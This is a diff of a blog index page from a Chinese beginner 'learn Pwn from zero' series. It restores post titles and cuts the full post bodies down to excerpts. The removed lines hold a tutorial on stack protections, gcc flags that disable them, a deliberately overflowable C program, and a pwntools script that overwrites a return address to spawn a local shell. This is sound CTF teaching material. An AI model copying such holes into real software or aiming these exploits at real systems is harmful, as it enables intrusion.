@@ -272,7 +272,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-2.%E4%BF%9D%E6%8A%A4%E5%92%8C%E6%BA%A2%E5%87%BA/" itemprop="url">Untitled</a></h1>
+                <a class="post-title-link" href="/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-2.%E4%BF%9D%E6%8A%A4%E5%92%8C%E6%BA%A2%E5%87%BA/" itemprop="url">从0开始学Pwn-2.保护概述和溢出实例</a></h1>
         
 
         <div class="post-meta">
@@ -323,77 +323,14 @@
 
       
         
-          
-            <h2 id="从0开始学Pwn-2-保护概述和溢出实例"><a href="#从0开始学Pwn-2-保护概述和溢出实例" class="headerlink" title="从0开始学Pwn-2.保护概述和溢出实例"></a>从0开始学Pwn-2.保护概述和溢出实例</h2><h3 id="保护概述"><a href="#保护概述" class="headerlink" title="保护概述"></a>保护概述</h3><p>保护是操作系统提供的，目的是为了降低或阻止缓冲区溢出攻击</p>
-<p>windows中提供了Dep(Linux下，Nx)， Aslr(Linux下，Pie)</p>
-<h4 id="常见保护类型"><a href="#常见保护类型" class="headerlink" title="常见保护类型"></a>常见保护类型</h4><h5 id="①Canary-栈保护"><a href="#①Canary-栈保护" class="headerlink" title="①Canary(栈保护)"></a>①Canary(栈保护)</h5><p>linux下，cookie信息被称为canary</p>
-<p>正常的缓冲区溢出攻击，是当函数存在漏洞时，攻击者可以覆盖栈上的返回地址，使得shellcode执行</p>
-<p>Canary保护下，函数开始调用时，会往其栈里插入cookie信息；当函数返回时，会验证cookie信息是否合法，而攻击者在覆盖栈时，往往会覆盖掉其上的cookie信息</p>
-<h5 id="③NX-DEP"><a href="#③NX-DEP" class="headerlink" title="③NX(DEP)"></a>③NX(DEP)</h5><p>即No-Execute(不可执行)，其会将数据所在的内存页标识为不可执行，程序溢出成功转入shellcode执行时，会尝试在数据页面执行指令，此时，CPU会抛出异常，拒绝执行恶意指令</p>
-<h5 id="④PIE-ASLR"><a href="#④PIE-ASLR" class="headerlink" title="④PIE(ASLR)"></a>④PIE(ASLR)</h5><p>地址空间分布随机化，存在三种情况</p>
-<p>0.表示关闭进程地址空间随机化</p>
-<p>1.表示将mmap的基址，stack和vdso页面随机化</p>
-<p>2.在1的基础上增加栈的随机化</p>
-<p>一般结合NX使用，可以防止基于Ret2libc方式针对NX发起的攻击</p>
-<h5 id="②Fornity"><a href="#②Fornity" class="headerlink" title="②Fornity"></a>②Fornity</h5><p>gcc编译器赋予的一种新的保护机制</p>
-<p>在编译时生成一些数组替换危险函数如：strcpy, memcpy, memset</p>
-<h5 id="⑤RWX"><a href="#⑤RWX" class="headerlink" title="⑤RWX"></a>⑤RWX</h5><p>设置符号重定向表格为只读or程序启动时解析并绑定所有动态符号，以减少对GOT攻击</p>
-<h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><p>在root权限下，针对一个程序的检查</p>
-<p><strong>检查保护情况</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec 文件名</span><br></pre></td></tr></table></figure>
-
-<p><strong>关闭栈保护</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie -fno-stack-protector -z execstack -m32 -o 2 2.c</span><br></pre></td></tr></table></figure>
-
-<p><strong>查看程序的函数详情</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objdump -t -j name</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">eg: objdump -t -j .text <span class="built_in">read</span></span></span><br></pre></td></tr></table></figure>
-
-<p>-t:显示文件符号表入口</p>
-<p>-j name :仅显示指定名称的section信息</p>
-<h3 id="溢出实例"><a href="#溢出实例" class="headerlink" title="溢出实例"></a>溢出实例</h3><p>c：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);  <span class="comment">//获取shell权限</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>, str, <span class="number">0x50</span>); <span class="comment">//存在缓冲区溢出</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过exp实现exploit函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数解析：</span></span><br><span class="line"><span class="comment">//system(&quot;/bin/sh&quot;)</span></span><br><span class="line"><span class="comment">//read函数</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="c语言知识："><a href="#c语言知识：" class="headerlink" title="c语言知识："></a>c语言知识：</h4><p><strong>system(“&#x2F;bin&#x2F;sh”)</strong></p>
-<p>执行该函数，可以获得shell权限</p>
-<p><strong>read函数</strong></p>
-<p>ssize_t read(int fd, void * buf, size_t count);</p>
-<p>read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中. </p>
-<p>buf: 读取缓冲区</p>
-<p>若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.</p>
-<h4 id="前期流程："><a href="#前期流程：" class="headerlink" title="前期流程："></a><strong>前期流程：</strong></h4><p><strong>编译(不开栈保护的32位程序)</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie -fno-stack-protector -z execstack -m32 -o 2 2.c</span><br></pre></td></tr></table></figure>
-
-<p><strong>文件提权</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 2 </span><br></pre></td></tr></table></figure>
-
-<p><strong>查询保护情况</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec 2</span><br></pre></td></tr></table></figure>
-
-<p><img src="C:\Users\小陈\AppData\Roaming\Typora\typora-user-images\image-20220307192940897.png" alt="image-20220307192940897"></p>
-<p><strong>检查函数详情</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -t -j .text 2 </span><br></pre></td></tr></table></figure>
-
-<p>以后复杂程序，使用ida查看函数，F5反汇编</p>
-<p><strong>反汇编</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb 2</span><br><span class="line">disass func</span><br><span class="line">b *0x08048457</span><br></pre></td></tr></table></figure>
-
-<p><img src="E:\弱弱的wp\笔记图片\pwn6.PNG" alt="pwn6"></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sub esp,<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">sub esp,<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">按道理应该分配<span class="number">28</span>字节,却分配了<span class="number">32</span>个字节,原因是为了保证读写速度,因为如果内存地址是<span class="number">16</span>的倍数(即十六进制表示末位为<span class="number">0</span>)读写会更快</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lea eax,[ebp<span class="number">-0x28</span>]  </span><br><span class="line"></span><br><span class="line">取地址指令</span><br><span class="line">将ds:ebp<span class="number">-0x28</span>对应的数据赋给eax</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="Exp-py编写"><a href="#Exp-py编写" class="headerlink" title="Exp.py编写"></a><strong>Exp.py编写</strong></h4><p><img src="E:\弱弱的wp\笔记图片\pwn8.PNG" alt="pwn8"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入pwntools库</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建一个进程，返回句柄</span></span><br><span class="line">p=process(<span class="string">&quot;./2&quot;</span>)   <span class="comment">#指定同一路径下程序</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#位移偏移量，覆盖栈帧空间+EBP</span></span><br><span class="line">offset= <span class="number">0x28</span> + <span class="number">0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#用&#x27;a&#x27;字符覆盖完0x28和EBP，查明exploit地址，用p32()覆盖RET</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*offset +p32(<span class="number">0x0804843b</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取运行时环境</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>chmod 777 exp.py</p>
-<p>python exp.py</p>
-<p>然后就可以拿shell，为所欲为了</p>
-
-          
+          <p>对程序的保护进行简单的了解，不同的保护实现了什么保护，其具体的功能是什么，我们又该如何绕过</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-2.%E4%BF%9D%E6%8A%A4%E5%92%8C%E6%BA%A2%E5%87%BA/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -459,7 +396,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-1.%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" itemprop="url">Untitled</a></h1>
+                <a class="post-title-link" href="/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-1.%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" itemprop="url">从0开始学Pwn-1.基础知识</a></h1>
         
 
         <div class="post-meta">
@@ -510,98 +447,14 @@
 
       
         
-          
-            <h2 id="从0开始学Pwn-1-基础知识"><a href="#从0开始学Pwn-1-基础知识" class="headerlink" title="从0开始学Pwn-1.基础知识"></a>从0开始学Pwn-1.基础知识</h2><h3 id="1-什么是pwn"><a href="#1-什么是pwn" class="headerlink" title="1.什么是pwn"></a>1.什么是pwn</h3><p><strong>攻破设备或者系统</strong></p>
-<p>CTF中PWN题型通常会直接给定一个已经编译好的二进制程序（Windows下的EXE或者Linux下的ELF文件等），然后参赛选手通过对二进制程 序进行逆向分析和调试来找到利用漏洞，并编写利用代码，通过远程代码执行来达到溢出攻击的效果，最终拿到目标机器的shell夺取flag</p>
-<h3 id="2-什么是溢出"><a href="#2-什么是溢出" class="headerlink" title="2.什么是溢出"></a>2.什么是溢出</h3><p><strong>溢出：</strong>要表示的数据超出计算机所使用数据表示的范围</p>
-<p><strong>原因：</strong></p>
-<p><strong>1.使用非类型安全语言：c&#x2F;c++等</strong></p>
-<p>（没有进行边界检查，数组，下标越界）</p>
-<p><strong>2.以不可靠的方式存取或复制内存缓冲区</strong></p>
-<p>（stringcopy函数之类的，没有限制缓冲区的长度）</p>
-<p><strong>3.编译器设置的内存缓冲区太靠近关键的数据结构</strong></p>
-<p>（缓冲区的数据，距离关键代码code段太近，溢出时，数据将code掩盖）</p>
-<h3 id="3-寄存器"><a href="#3-寄存器" class="headerlink" title="3.寄存器"></a>3.寄存器</h3><p><img src="C:\Users\小陈\AppData\Roaming\Typora\typora-user-images\image-20220306144815568.png" alt="image-20220306144815568"></p>
-<p>《汇编语言》王爽 ：书籍内容均为16位寄存器</p>
-<h4 id="16位寄存器："><a href="#16位寄存器：" class="headerlink" title="16位寄存器："></a><strong>16位寄存器：</strong></h4><p>通用寄存器：AX, BX, CX, DX</p>
-<p>变址寄存器：SI, DI</p>
-<p>指针寄存器：BP, SP</p>
-<p>段寄存器：CS, DS, ES, SS  </p>
-<p>指令指针寄存器：IP</p>
-<p>BP: 基数指针寄存器BP(base pointer)是一个寄存器，它的用途有点特殊，是和堆栈指针SP联合使用的，作为SP校准使用的，只有在寻找堆栈里的数据和使用个别的寻址方式时候才能用到</p>
-<h4 id="32位寄存器："><a href="#32位寄存器：" class="headerlink" title="32位寄存器："></a><strong>32位寄存器：</strong></h4><p>ESP：存放栈顶地址，在push和pop时发生变化</p>
-<p>EBP：存储当前函数状态的基地址，函数运行时不变，用来索引确定函数参数or局部变量位置</p>
-<p>EIP：存储程序指令的地址</p>
-<h4 id="x86-64位的寄存器"><a href="#x86-64位的寄存器" class="headerlink" title="x86-64位的寄存器"></a>x86-64位的寄存器</h4><p>以R开头，如Rax, rbp, rsp, rsi, rdi等等</p>
-<h3 id="4-基础汇编"><a href="#4-基础汇编" class="headerlink" title="4.基础汇编"></a>4.基础汇编</h3><p>1）32位x86架构下，有两种汇编风格，Intel和AT&amp;T</p>
-<p>前者intel风格是我们初期入门常见的，会学习到的</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hdk1993/p/4820353.html">https://www.cnblogs.com/hdk1993/p/4820353.html</a></p>
-<p>Intel:   寄存器,数值前无符号</p>
-<p>AT&amp;T: 寄存器前”%”,数值前”$”</p>
-<p>2）<strong>常见指令</strong></p>
-<p>mov: 传送指令</p>
-<p>push:入栈指令</p>
-<p>pop:出栈指令</p>
-<p>add&#x2F;sub:加减法</p>
-<p>lea:取地址指令，将后者地址存放到前者：lea reg,  mem</p>
-<p>call:调用指令，将当前eip压入栈顶，并将ptr存入eip:    call ptr </p>
-<p>ret：程序返回，修改IP地址  </p>
-<p>enter：复合:  push bp    mov bp,sp       </p>
-<p>leave:  复合： mov sp,bp   pop bp</p>
-<p>​               </p>
-<h3 id="5-什么是栈帧"><a href="#5-什么是栈帧" class="headerlink" title="5.什么是栈帧"></a>5.什么是栈帧</h3><p>函数调用过程&#x3D;&#x3D;栈帧</p>
-<p>栈帧是编译器实现函数调用过程的一种数据结构，逻辑上讲，栈帧是一个函数执行的环境</p>
-<p>每个函数的每次调用，都有它自己独立的一个栈帧</p>
-<p>寄存器ebp指向当前的栈帧的底部（高地址），寄存器esp指向当前的栈帧的顶部（低地址）。</p>
-<p><img src="C:\Users\小陈\AppData\Roaming\Typora\typora-user-images\image-20220307204054660.png" alt="image-20220307204054660"></p>
-<p>汇编指令中，enter为了申请一个栈帧，sub esp为了申请栈帧空间</p>
-<h3 id="6-一个简单实例"><a href="#6-一个简单实例" class="headerlink" title="6.一个简单实例"></a>6.一个简单实例</h3><h4 id="1-C语言文件编译连接"><a href="#1-C语言文件编译连接" class="headerlink" title="1. C语言文件编译连接"></a>1. C语言文件编译连接</h4><p>创建test.c文件</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> c = a+b;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> d = test(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编译连接</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">笔者将test.c文件置于pwn文件夹下</span></span><br><span class="line">cd /home/chen/pwn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">文件提权</span></span><br><span class="line">chmod 777 test.c</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">vi模式打开</span></span><br><span class="line">vi test.c</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">gcc编译为32位程序</span></span><br><span class="line">gcc -m32 -o test test.c</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">或者 gcc test.c -o <span class="built_in">test</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">gcc -Wall -g -o <span class="built_in">test</span> test.c</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行</span></span><br><span class="line">./text</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="2-分析第一个程序"><a href="#2-分析第一个程序" class="headerlink" title="2.分析第一个程序"></a>2.分析第一个程序</h4><p>使用gdb+pwndbg和pwntools</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb test</span><br><span class="line">disass main</span><br><span class="line">disass 1</span><br><span class="line">b *0x00000000004004f0  #打断点，打在test位置</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">delete                <span class="comment">#删断点</span></span>  </span><br><span class="line">r   #运行程序</span><br><span class="line">n   #下一跳</span><br><span class="line"></span><br><span class="line">start  #启动程序</span><br><span class="line">n      #下一跳</span><br></pre></td></tr></table></figure>
-
-<p><strong>通过分析程序，需要理解的知识点：</strong></p>
-<p>pwndbg基础命令</p>
-<p>对栈帧的理解</p>
-<p>汇编指令的理解</p>
-<p><strong>0)打上断点，r启动</strong></p>
-<p><img src="C:\Users\小陈\AppData\Roaming\Typora\typora-user-images\image-20220306204443294.png" alt="image-20220306204443294"></p>
-<p><strong>1)四个区域：</strong></p>
-<p>Registers: 寄存器</p>
-<p>​		存放常用寄存器的地址</p>
-<p>Disasm：反组译码视窗&#x2F;汇编指令</p>
-<p>​		汇编指令的跟踪</p>
-<p>Stack：栈帧</p>
-<p>​		在函数调用结束后，esp,ebp会复原</p>
-<p>Backtrace：回退跟踪</p>
-<p>​		</p>
-<p><strong>2）n进行下一跳</strong></p>
-<p>Registers中数据变化的寄存器，其前会有*标注</p>
-<p>Stack中的栈顶指针，需要自己进行分析</p>
-<p><img src="C:\Users\小陈\AppData\Roaming\Typora\typora-user-images\image-20220307125806096.png" alt="image-20220307125806096"></p>
-<p>绿色箭头的位置：代表该条指令已经执行</p>
-<p>此处讲一下汇编指令处的几条命令</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建一个栈帧</span></span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">申请一段栈帧空间</span></span><br><span class="line">sub esp, 0x10</span><br><span class="line"></span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">结束这个栈帧</span></span><br><span class="line">leave</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">程序返回，目的是返回地址出栈，从而实现转移到返回地址处</span></span><br><span class="line">ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><strong>3)一个完整的函数调试流程 (理解栈帧)</strong></p>
-<p>结合汇编指令Disasm，重点观察栈帧Stack中esp,ebp的变化</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开始：</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">实现创建一个栈帧</span></span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">结尾:</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">释放栈帧</span></span><br><span class="line">leave</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">leave == mov esp,ebp  pop ebp</span></span><br></pre></td></tr></table></figure>
-
-<p>断点打在test函数</p>
-<p><img src="C:\Users\小陈\AppData\Roaming\Typora\typora-user-images\image-20220307125426710.png" alt="image-20220307125426710"></p>
-<p>经过leave,ret指令后，test函数结束时</p>
-<p><img src="C:\Users\小陈\AppData\Roaming\Typora\typora-user-images\image-20220307125551635.png" alt="image-20220307125551635"></p>
-<p>可以表明栈帧在一个函数调用过程结束后，便会复原</p>
-<h3 id="7-函数调用"><a href="#7-函数调用" class="headerlink" title="7.函数调用"></a>7.函数调用</h3><p>涉及到两个概念，函数续和函数跋</p>
-<p>其是编译器自己添加的开始和结束汇编代码，只与CPU架构和编译器有关</p>
-
-          
+          <p>对基础知识进行简单的了解</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-1.%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -667,7 +520,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-0.%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86+%E7%8E%AF%E5%A2%83%E7%AF%87/" itemprop="url">Untitled</a></h1>
+                <a class="post-title-link" href="/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-0.%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86+%E7%8E%AF%E5%A2%83%E7%AF%87/" itemprop="url">从0开始学Pwn-0.汇编语言+环境篇</a></h1>
         
 
         <div class="post-meta">
@@ -718,7 +571,7 @@
 
       
         
-          <h1 id="从0开始学Pwn-0-汇编语言-环境篇"><a href="#从0开始学Pwn-0-汇编语言-环境篇" class="headerlink" title="从0开始学Pwn-0.汇编语言+环境篇"></a>从0开始学Pwn-0.汇编语言+环境篇</h1><p>pwn的学习就是从汇编语言和搭建环境开始的</p>
+          <p>pwn的学习就是从汇编语言和搭建环境开始的</p>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-0.%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86+%E7%8E%AF%E5%A2%83%E7%AF%87/#more" rel="contents">
